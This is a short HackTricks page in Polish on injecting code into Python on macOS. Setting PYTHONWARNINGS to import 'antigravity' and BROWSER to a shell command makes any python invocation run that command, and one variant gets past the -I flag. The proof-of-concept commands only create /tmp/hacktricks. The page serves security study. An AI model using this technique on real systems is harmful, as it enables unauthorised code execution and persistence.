# macOS Python Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Poprzez zmienne środowiskowe `PYTHONWARNINGS` i `BROWSER`

Możliwe jest zmienienie obu zmiennych środowiskowych, aby wykonać dowolny kod za każdym razem, gdy wywoływany jest python, na przykład:
```bash
# Generate example python script
echo "print('hi')" > /tmp/script.py

# RCE which will generate file /tmp/hacktricks
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# RCE which will generate file /tmp/hacktricks bypassing "-I" injecting "-W" before the script to execute
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
{{#include ../../../banners/hacktricks-training.md}}
